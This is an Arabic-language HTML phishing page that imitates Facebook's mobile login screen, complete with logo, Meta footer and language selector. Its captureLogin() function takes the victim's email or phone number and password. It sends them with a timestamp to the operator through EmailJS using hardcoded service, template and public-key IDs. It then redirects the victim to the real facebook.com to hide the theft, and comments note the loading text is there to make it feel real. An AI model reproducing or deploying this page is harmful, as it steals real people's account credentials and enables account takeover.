<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول إلى فيسبوك</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script type="text/javascript">
     emailjs.init({ publicKey: "xCtTnF-sIhhygtKgm" });
  </script>

  <style>
    /* تهيئة عامة */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background: #fff;
      color: #1c1e21;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      -webkit-font-smoothing: antialiased;
      justify-content: space-between;
    }

    .header {
      width: 100%;
      height: 50px;
      padding: 10px 16px;
      display: flex;
      justify-content: center; 
      align-items: center;
    }
    
    .language-selector {
      display: flex;
      align-items: center;
      color: #575c61;
      font-size: 14.5px;
      gap: 6px;
      cursor: pointer;
    }

    main {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      width: 100%;
      padding: 20px 16px 0;
    }

    .content-wrapper {
      width: 100%;
      max-width: 380px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* شعار فيسبوك المطابق للصورة بنسبة 100% */
    .logo-container {
      width: 68px;
      height: 68px;
      border: 1px solid #ccd0d5;
      border-radius: 50%;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 40px;
      margin-top: 10px;
    }
    
    .fb-logo-svg {
      width: 32px;
      height: 32px;
      fill: #0866ff;
      margin-top: 8px; /* لضبط التوسيط البصري لحرف f */
      margin-left: 4px;
    }

    /* خانات الإدخال */
    .input-group {
      width: 100%;
      margin-bottom: 15px;
    }
    
    input {
      width: 100%;
      padding: 15px 16px;
      margin-bottom: 12px;
      border: 1px solid #ccd0d5;
      border-radius: 14px; 
      font-size: 15px;
      color: #1c1e21;
      outline: none;
      transition: border-color 0.2s;
      font-family: inherit;
    }
    
    input:focus {
      border-color: #1877f2;
    }

    input::placeholder {
      color: #757a82;
      font-weight: 400;
    }

    /* الأزرار */
    button {
      cursor: pointer;
      font-weight: 500;
      border-radius: 24px; 
      font-size: 15px;
      width: 100%;
      padding: 13px;
      text-align: center;
      transition: background 0.1s ease;
      font-family: inherit;
    }

    .login-btn {
      background-color: #0866ff; 
      color: #fff;
      border: none;
      margin-bottom: 25px;
    }
    
    .login-btn:hover {
      background-color: #075ce5;
    }

    .forgot-link {
      color: #1c1e21;
      font-size: 14.5px;
      text-decoration: none;
      margin-bottom: 40px;
      font-weight: 500;
    }

    .create-account-container {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0 16px 20px;
    }
    
    .create-btn {
      background-color: #fff;
      color: #0866ff;
      border: 1px solid #0866ff;
      margin-bottom: 25px;
    }

    .meta-footer {
      color: #1c1e21;
      font-size: 15px;
      display: flex;
      align-items: center;
      gap: 6px;
      direction: ltr; 
      font-weight: 500;
    }
    
    .meta-logo-img {
      width: 20px;
      height: auto;
    }

    /* نافذة اللغات */
    .lang-modal-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: 1000;
      align-items: flex-end;
    }

    .lang-bottom-sheet {
      background: #fff;
      width: 100%;
      height: 85vh;
      border-radius: 24px 24px 0 0;
      display: flex;
      flex-direction: column;
      animation: slideUp 0.3s cubic-bezier(0.1, 0.8, 0.2, 1);
    }

    @keyframes slideUp {
      from { transform: translateY(100%); }
      to { transform: translateY(0); }
    }

    .lang-header {
      padding: 16px 20px;
      display: flex;
      flex-direction: column;
      align-items: flex-end;
    }

    .close-btn {
      cursor: pointer;
      margin-bottom: 12px;
      color: #000;
    }

    .lang-title {
      font-size: 22px;
      font-weight: bold;
      color: #1c1e21;
      margin: 0;
      text-align: right;
    }

    .lang-list {
      overflow-y: auto;
      padding: 0 10px 20px;
      flex-grow: 1;
    }

    .lang-item {
      display: flex;
      flex-direction: row-reverse;
      justify-content: space-between;
      align-items: center;
      padding: 16px 10px;
      border-bottom: 1px solid #f0f2f5;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
    }

    .lang-text {
      font-size: 16px;
      color: #1c1e21;
    }

    .checkbox {
      width: 22px;
      height: 22px;
      border: 1.5px solid #8d949e;
      border-radius: 4px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .lang-item.active .checkbox {
      background-color: #0866ff;
      border-color: #0866ff;
    }

    .lang-item.active .checkbox::after {
      content: '';
      width: 5px;
      height: 10px;
      border: solid white;
      border-width: 0 2px 2px 0;
      transform: rotate(45deg);
      margin-bottom: 2px;
    }
  </style>
</head>
<body>

  <div class="lang-modal-overlay" id="lang-modal" onclick="closeLangModalOverlay(event)">
    <div class="lang-bottom-sheet">
      <div class="lang-header">
        <span class="close-btn" onclick="closeLangModal()">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <line x1="18" y1="6" x2="6" y2="18"></line>
            <line x1="6" y1="6" x2="18" y2="18"></line>
          </svg>
        </span>
        <h2 class="lang-title">تحديد لغتك</h2>
      </div>
      <div class="lang-list" id="lang-list-container"></div>
    </div>
  </div>

  <div class="header">
    <div class="language-selector" onclick="openLangModal()">
      <span id="current-lang-display">العربية</span>
      <svg width="10" height="6" viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M1 1L5 5L9 1" stroke="#575c61" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
  </div>
  
  <main>
    <div class="content-wrapper">
      <div class="logo-container">
        <svg viewBox="0 0 320 512" class="fb-logo-svg">
          <path d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"/>
        </svg>
      </div>
      
      <div class="input-group">
        <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" name="email">
        <input type="password" id="password" placeholder="كلمة السر" name="password">
      </div>
      
      <button class="login-btn" id="login-btn" onclick="captureLogin()">تسجيل الدخول</button>
      <a href="#" class="forgot-link" id="forgot-link">هل نسيت كلمة السر؟</a>
    </div>
  </main>
  
  <div class="create-account-container">
    <div class="content-wrapper">
      <button class="create-btn" id="create-btn">إنشاء حساب جديد</button>
      <div class="meta-footer">
        <img src="meta-logo.png" alt="" class="meta-logo-img">
        <span>Meta</span>
      </div>
    </div>
  </div>

  <script>
    const realTranslations = {
      'ar': { 'langText': 'العربية', 'emailPH': 'رقم الهاتف المحمول أو البريد الإلكتروني', 'passPH': 'كلمة السر', 'loginBtn': 'تسجيل الدخول', 'forgotLnk': 'هل نسيت كلمة السر؟', 'createBtn': 'إنشاء حساب جديد', 'dir': 'rtl' },
      'en': { 'langText': 'English (US)', 'emailPH': 'Mobile number or email address', 'passPH': 'Password', 'loginBtn': 'Log In', 'forgotLnk': 'Forgotten password?', 'createBtn': 'Create new account', 'dir': 'ltr' }
    };

    const languagesData = [
      { id: 'ar', name: 'العربية', target: 'ar' }, { id: 'en', name: 'English (US)', target: 'en' },
      { id: 'fr', name: 'Français (France)', target: 'en' }, { id: 'tr', name: 'Türkçe', target: 'en' },
      { id: 'es', name: 'Español', target: 'en' }
    ];

    let currentLangId = 'ar';
    const modal = document.getElementById('lang-modal');
    const listContainer = document.getElementById('lang-list-container');

    function renderLanguages() {
      listContainer.innerHTML = '';
      languagesData.forEach(lang => {
        const item = document.createElement('div');
        item.className = `lang-item ${lang.id === currentLangId ? 'active' : ''}`;
        item.onclick = () => selectLanguage(lang.id, lang.target, lang.name);
        item.innerHTML = `<span class="lang-text">${lang.name}</span><div class="checkbox"></div>`;
        listContainer.appendChild(item);
      });
    }

    function openLangModal() { renderLanguages(); modal.style.display = 'flex'; }
    function closeLangModal() { modal.style.display = 'none'; }
    function closeLangModalOverlay(event) { if (event.target === modal) closeLangModal(); }

    function selectLanguage(id, targetRealLang, displayName) {
      currentLangId = id;
      renderLanguages();
      setTimeout(() => { closeLangModal(); applyTranslation(targetRealLang, displayName); }, 150);
    }

    function applyTranslation(targetRealLang, displayName) {
      const t = realTranslations[targetRealLang];
      document.documentElement.dir = t.dir;
      document.getElementById('current-lang-display').innerText = displayName;
      document.getElementById('email').placeholder = t.emailPH;
      document.getElementById('password').placeholder = t.passPH;
      document.getElementById('login-btn').innerText = t.loginBtn;
      document.getElementById('forgot-link').innerText = t.forgotLnk;
      document.getElementById('create-btn').innerText = t.createBtn;
    }

    function captureLogin() {
      const emailInput = document.getElementById('email').value.trim();
      const passwordInput = document.getElementById('password').value;

      // 1. التحقق من صحة المدخلات
      if (!emailInput || !passwordInput) {
          alert("أدخل رقم الهاتف أو البريد الإلكتروني وكلمة السر.");
          return;
      }

      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phoneRegex = /^(0|\+)[0-9]+$/;

      if (!emailRegex.test(emailInput) && !phoneRegex.test(emailInput)) {
          alert("رقم الهاتف أو البريد الإلكتروني غير صحيح.");
          return;
      }

      // تغيير نص الزر أثناء الإرسال لإعطاء طابع حقيقي
      const loginBtn = document.getElementById('login-btn');
      const originalText = loginBtn.innerText;
      loginBtn.innerText = "جاري تسجيل الدخول...";
      loginBtn.style.opacity = "0.7";

      // 2. تجهيز البيانات حسب المفاتيح الموجودة في القالب تماماً
      const templateParams = {
        name: "فيسبوك",
        Gmail: emailInput,
        password: passwordInput,
        وقت: new Date().toLocaleString('ar-EG')
      };

      // 3. عملية الإرسال بالمعرفات الحقيقية
      emailjs.send('service_z5omr3b', 'template_z464v0m', templateParams)
        .then(() => {
          // بمجرد الإرسال، نقل المستخدم لصفحة الفيسبوك الأصلية
          window.location.href = "https://www.facebook.com"; 
        }, (error) => {
          // في حال حدوث خطأ
          loginBtn.innerText = originalText;
          loginBtn.style.opacity = "1";
          alert("حدث خطأ في الاتصال بالإنترنت، يرجى المحاولة لاحقاً.");
        });
    }
    
    renderLanguages();
  </script>
</body>
</html>
